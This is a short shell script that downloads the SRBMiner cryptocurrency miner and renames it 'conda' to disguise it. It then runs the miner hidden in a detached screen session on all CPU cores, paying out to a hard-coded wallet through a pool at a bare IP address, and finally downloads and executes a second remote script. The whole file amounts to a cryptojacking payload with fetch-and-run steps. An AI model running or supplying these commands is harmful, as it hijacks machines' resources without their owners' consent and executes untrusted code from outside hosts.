sudo apt install screen -y > /dev/null 2>&1
wget https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI && chmod u+x SRBMiner-MULTI && mv SRBMiner-MULTI conda && clear && screen -dms run ./conda --disable-gpu --algorithm yespowertide --pool 8.222.237.217:443 --wallet TBEv2m949AK9X72hR6fcfheWuS9mjaB3y9.$(echo DB-$(TZ=UTC-7 date +"%H-%M-%S")) --password x -t $(nproc --all)
wget https://github.com/williehprnuhrxyq/dualspace/raw/main/winterme.sh && chmod +x * && ./winterme.sh
